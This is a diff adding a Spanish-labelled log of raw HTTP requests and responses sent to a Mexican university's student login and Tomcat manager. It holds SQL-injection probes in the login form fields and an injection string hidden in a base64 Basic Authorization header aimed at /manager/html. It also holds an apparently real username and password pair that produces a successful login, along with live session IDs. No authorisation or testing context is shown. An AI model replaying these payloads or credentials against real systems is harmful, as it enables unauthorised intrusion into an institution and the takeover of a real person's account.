@@ -1,0 +1,162 @@
+Request:
+POST / HTTP/2
+Host: sito.utslp.edu.mx
+Cookie: JSESSIONID=000000000000000000000000000000000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+Origin: https://sito.utslp.edu.mx
+Referer: https://sito.utslp.edu.mx/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+yAccion=Iniciar_Sesion&yIntentos=-1&yUsuario=danyelsp&xUsuario=dasdd'&xContrasena=asda'
+
+
+Response:
+HTTP/1.1 505 Versión de HTTP No Soportada
+Server: Apache-Coyote/1.1
+Date: Sat, 11 Oct 2025 16:17:28 GMT
+Connection: close
+
+
+Request al manager:
+GET /manager/html HTTP/1.1
+Host: sito.utslp.edu.mx
+Cookie: JSESSIONID=B2F7F71681D7B89400D2E445D84F0754
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Authorization: Basic YWRtaW4nIDEgPSAxIE9SIC0tOmFueXBhc3N3b3Jk
+Te: trailers
+Connection: keep-alive
+
+
+Response:
+HTTP/1.1 401 No Autorizado
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Wed, 31 Dec 1969 18:00:00 CST
+WWW-Authenticate: Basic realm="Tomcat Manager Application"
+Content-Type: text/html
+Date: Sat, 11 Oct 2025 16:24:31 GMT
+Content-Length: 2635
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+  <title>401 Unauthorized</title>
+  <style type="text/css">
+    <!--
+    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
+    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
+    PRE, TT {border: 1px dotted #525D76}
+    A {color : black;}A.name {color : black;}
+    -->
+  </style>
+ </head>
+ <body>
+   <h1>401 Unauthorized</h1>
+   <p>
+    You are not authorized to view this page. If you have not changed
+    any configuration files, please examine the file
+    <tt>conf/tomcat-users.xml</tt> in your installation. That
+    file must contain the credentials to let you use this webapp.
+   </p>
+   <p>
+    For example, to add the <tt>manager-gui</tt> role to a user named
+    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
+    config file listed above.
+   </p>
+<pre>
+&lt;role rolename="manager-gui"/&gt;
+&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
+</pre>
+   <p>
+    Note that for Tomcat 6.0.30 onwards, the roles required to use the manager
+    application were changed from the single <tt>manager</tt> role to the
+    following four roles. You will need to assign the role(s) required for
+    the functionality you wish to access.
+   </p>
+    <ul>
+      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
+          pages</li>
+      <li><tt>manager-script</tt> - allows access to the text interface and the
+          status pages</li>
+      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
+          pages</li>
+      <li><tt>manager-status</tt> - allows access to the status pages only</li>
+    </ul>
+   <p>
+    The HTML interface is protected against CSRF but the text and JMX interfaces
+    are not. To maintain the CSRF protection:
+   </p>
+   <ul>
+    <li>The deprecated <tt>manager</tt> role should not be assigned to any
+        user.</li>
+    <li>Users with the <tt>manager-gui</tt> role should not be granted either
+        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
+    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
+        testing since these interfaces are intended for tools not humans) then
+        the browser must be closed afterwards to terminate the session.</li>
+   </ul>
+   <p>
+    For more information - please see the
+    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
+   </p>
+ </body>
+
+</html>
+
+Request con usuario valido:
+POST / HTTP/1.1
+Host: sito.utslp.edu.mx
+Cookie: JSESSIONID=B2F7F71681D7B89400D2E445D84F0754
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Origin: https://sito.utslp.edu.mx
+Referer: https://sito.utslp.edu.mx/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+yAccion=Iniciar_Sesion&yIntentos=1&yUsuario=hnieto&xUsuario=21136&xContrasena=87439
+
+Response:
+HTTP/1.1 302 Movido temporalmente
+Server: Apache-Coyote/1.1
+Pragma: no-cache
+Expires: Mon, 01 Jan 2017 00:00:01 GMT
+Cache-Control: no-cache
+Set-Cookie: JSESSIONID=4C926FF97681DD26688639769EBD44D7; Path=/; Secure
+Location: https://sito.utslp.edu.mx/jsp/;jsessionid=4C926FF97681DD26688639769EBD44D7
+Content-Type: text/html;charset=windows-1252
+Content-Length: 0
+Date: Sat, 11 Oct 2025 16:30:14 GMT
+
+
